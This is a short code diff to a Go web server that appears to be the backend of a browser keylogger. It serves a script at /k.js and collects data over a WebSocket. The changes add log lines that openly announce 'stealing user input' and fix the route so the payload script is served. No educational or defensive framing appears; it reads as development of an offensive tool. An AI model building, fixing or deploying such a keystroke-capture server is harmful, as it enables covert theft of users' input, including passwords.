@@ -32,6 +32,7 @@ func init() {
 }
 
 func servWS(w http.ResponseWriter, r *http.Request) {
+	log.Println("[*] WebSocket created, stealing user input.")
 	conn, err := upgrader.Upgrade(w, r, nil)
 	if err != nil {
 		http.Error(w, "", 500)
@@ -49,6 +50,7 @@ func servWS(w http.ResponseWriter, r *http.Request) {
 }
 
 func serveFile(w http.ResponseWriter, r *http.Request) {
+	log.Println("[*] /k.js hit!")
 	w.Header().Set("Content-Type", "application/javascript")
 	jsTemplate.Execute(w, wsAddr)
 }
@@ -56,6 +58,7 @@ func serveFile(w http.ResponseWriter, r *http.Request) {
 func main() {
 	r := mux.NewRouter()
 	r.HandleFunc("/ws", servWS)
-	r.HandleFunc("k.js", serveFile)
+	r.HandleFunc("/k.js", serveFile)
+	log.Println("[*] Server starting")
 	log.Fatal(http.ListenAndServe(":8080", r))
 }
